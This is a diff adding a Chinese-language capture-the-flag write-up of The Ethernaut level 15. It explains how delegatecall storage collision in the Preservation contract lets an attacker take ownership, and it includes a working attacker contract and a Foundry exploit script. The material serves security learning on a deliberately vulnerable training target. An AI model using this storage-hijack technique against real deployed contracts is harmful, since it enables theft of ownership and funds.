@@ -517,3 +517,40 @@ cast call 0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3 \
 - [level(`Privacy`)](https://sepolia.etherscan.io/address/0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3)
 - [Attacker](https://sepolia.etherscan.io/tx/0x160FeC247F3578DF771333FB5108352434AE3fAE)
 - [attack 交易](https://sepolia.etherscan.io/tx/0xd97d0d2933a94cc266086631dd13d9932a896f928d75616c86e5dbde9b25ce28)
+
+
+
+## lelve 15
+
+[The Ethernaut level 15](https://ethernaut.openzeppelin.com/level/15)
+
+这一关的目的是解锁获取 Preservation 合约的所有权。
+
+仔细阅读这个合约，发现 `Preservation` 使用了 `delegatecall`。这就很容易发生存储冲突的问题。果不其然，`LibraryContract` 的 `setTime` 函数修改 `storedTime` 变量。该变量在 `LibraryContract` 合约是在 `slot0`。但是由于是 `delegatecall`，真正被修改的是 调用者，即 Preservation 合约的 `slot0`。·
+
+要想成为 owner，可以利用这个漏洞，调用 `setFirstTime` 时 把 `timeZone1Library` 改为攻击者合约。再次调用 `setFirstTime` 时，使用的是攻击者合约的逻辑。可以在攻击者合约部署和 `Preservation` 一样的存储，进而修改 `owner`
+
+攻击者合约：
+```
+contract Attacker {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 time) public {
+        owner = address(uint160(time));
+    }
+}
+```
+
+攻击脚本：
+```
+address player = vm.addr(1);
+vm.startPrank(player);
+
+level.setFirstTime(uint256(uint160(address(attacker))));
+
+level.setFirstTime(uint256(uint160(address(player))));
+```
+
+完整代码见：[这里](ethernaut/test/level16.s.sol)
